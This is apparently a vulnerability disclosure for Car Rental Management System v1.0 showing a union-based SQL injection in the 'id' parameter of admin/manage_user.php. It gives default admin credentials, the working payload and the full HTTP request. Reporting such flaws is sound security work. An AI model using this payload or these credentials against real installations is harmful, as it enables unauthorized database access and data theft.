# Car Rental Management System v1.0 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.campcodes.com/projects/php/car-rental-management-system/

Vulnerability File: /car-rental-management-system/admin/manage_user.php?id=

Vulnerability location: /car-rental-management-system/admin/manage_user.php?id=,id

[+] Payload: /car-rental-management-system/admin/manage_user.php?id=-1%20union%20select%201,database(),3,4,5--+ // Leak place ---> id

Current database name: car_rental_db

```sql
GET /car-rental-management-system/admin/manage_user.php?id=-1%20union%20select%201,database(),3,4,5--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=q0aiu0hqk51vrl4kivubc7u18k
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/170961812-190fd13b-af92-4487-a183-a462bb9b9bca.png)

![image](https://user-images.githubusercontent.com/54017627/170962011-f88fb894-0164-453b-97c4-9ff1b8bdc6a3.png)
